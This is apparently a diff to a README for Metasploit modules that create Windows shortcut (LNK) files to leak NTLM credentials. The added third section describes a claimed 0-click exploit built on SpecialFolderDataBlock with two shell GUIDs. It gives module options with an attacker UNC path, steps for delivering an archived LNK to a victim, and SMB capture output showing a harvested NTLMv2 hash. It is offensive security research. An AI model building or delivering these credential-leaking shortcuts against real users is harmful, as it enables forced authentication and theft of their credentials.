@@ -3,7 +3,7 @@ Here is my collection of `Extra Data` structure of Windows Shell Link (LNK) NTLM
 
 ---
 
-# 1. EnvironmentVariableDataBlock Leak - Metasploit Auxiliary Module
+# 1. EnvironmentVariableDataBlock NTLM Leak - Metasploit Auxiliary Module
 Right-Click Leak - Windows LNK File Special UNC Path NTLM Leak
 
 ### Overview
@@ -58,7 +58,7 @@ This module creates a Windows shortcut (LNK) file that specifies a special UNC p
 
 --- 
 
-# 2. IconEnvironmentDataBlock - Metasploit Auxiliary Module
+# 2. IconEnvironmentDataBlock NTLM Leak - Metasploit Auxiliary Module
 IconEnvironmentDataBlock - Windows LNK File Special UNC Path NTLM Leak
 
 ## Overview
@@ -116,3 +116,75 @@ This module creates a malicious Windows shortcut (LNK) file that specifies a spe
 - `DESCRIPTION`: The description that will appear when hovering over the shortcut
 - `ICON_PATH`: The path to your own icon. Does not necessary to point to actual ICON file (e.g. a)
 
+---
+
+# 3. SpecialFolderDatablock NTLM Leak - Metasploit Auxiliary Module
+This one is the real 0-click LNK NTLM Leak
+
+Description:
+The SpecialFolderDataBlock is a data structure within Windows Shell Link (.LNK) files, defined as follows:
+```c
+typedef struct _SpecialFolderDataBlock {
+    DWORD    BlockSize;        // Must be 0x00000010 (16 bytes)
+    DWORD    BlockSignature;   // Must be 0xA0000005
+    DWORD    SpecialFolderID;  // CSIDL value identifying the special folder
+    DWORD    Offset;           // Offset to the first child ItemID in the IDList
+} SPECIAL_FOLDER_DATA_BLOCK;
+```
+The SpecialFolderDataBlock is designed to help Windows maintain shortcut functionality when paths change. It provides two key pieces of information:
+- Which special folder is being targeted (via SpecialFolderID)
+- Where in the shortcut's ItemIDList that special folder's data begins (via Offset)
+
+When a shortcut is loaded, Windows uses this information to:
+- Locate the current path to the special folder (which may have changed)
+- Replace or update the corresponding section of the shortcut's ItemIDList
+- Maintain the shortcut's functionality despite system changes
+
+The GUID {20D04FE0-3AEA-1069-A2D8-08002B30309D} is a special identifier that Windows uses to recognize the "My Computer" or "This PC" folder in the shell namespace. When you see this sequence in an ItemID within a Windows shortcut (.lnk) file, it indicates that the shortcut is referencing the "My Computer" location as part of its target path. 
+
+In this proof of concept, I used two GUID and concatenate it to get the exploit works.
+- Control Panel (All Tasks)
+    - {ED7BA470-8E54-465E-825C-99712043E01C} 
+- This PC
+    - {20D04FE0-3AEA-1069-A2D8-08002B30309D}
+
+These two GUID introduce the attack vector of UNC Path Injection for credential harvesting. The SpecialFolderDataBlock can be combined with network paths (UNC paths) to create shortcuts that connect to remote servers when activated.
+
+Further investigation, I found that this seems to related with CVE-2017-8464 (LNK RCE) vulnerability. It seems the fix is not enough where it still allows UNC path to execute in the context of accessing share drive.
+
+Attack Scenario:
+- A shortcut is crafted with a SpecialFolderDataBlock that redirects to a UNC path (\\\\attacker-server\\share). When the victim access the shortcut, their system attempts to (force) authenticate to the attacker's server, sending their credentials.
+
+Usage:
+1. Setup the following pre-req then execute `run` command:
+```
+msf6 auxiliary(fileformat/specialfolder_lnk) > show options
+
+Module options (auxiliary/fileformat/specialfolder_lnk):
+
+   Name      Current Setting         Required  Description
+   ----      ---------------         --------  -----------
+   APPNAME   abc                     yes       Name of the application to display
+   FILENAME  def.lnk                 yes       The LNK file name
+   UNCPATH   \\192.168.44.128\share  yes       UNC path that will be accessed (\\server\share)
+
+View the full module info with the info, or info -d command.
+```
+
+2. Once the LNK generated, archive the LNK file and deliver it via web (I hosted it using Python Server). On the victim side, download the archive file and extract in the same directory. The moment you extracted it, the NTLM hash will gets leaked. 
+```
+msf6 auxiliary(fileformat/specialfolder_lnk) > use auxiliary/server/capture/smb
+msf6 auxiliary(server/capture/smb) > run
+[*] Auxiliary module running as background job 1.
+
+[*] Server is running. Listening on 0.0.0.0:445
+[*] Server started.
+
+[+] Received SMB connection on Auth Capture Server!
+[SMB] NTLMv2-SSP Client     : 192.168.44.131
+[SMB] NTLMv2-SSP Username   : DESKTOP-ABCDEFG\pokemon
+[SMB] NTLMv2-SSP Hash       : pokemon::DESKTOP-ABCDEFG:078c9c8105d5b348:7219c59f7e2af0a03cb1c772b04a7cc6:01010000000000000008905dc5c1db017a891d0f46fea4c2000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f0055005000070008000008905dc5c1db010600040002000000080030003000000000000000000000000020000074c74f32e7de25f7436a66377dc75c94aaf8be0006c4cd2c745c6b3b3f83552f0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340034002e003100320038000000000000000000
+```
+ 
+Observed Result:
+NTLMv2 credential successfully harvest and send to attacker server.
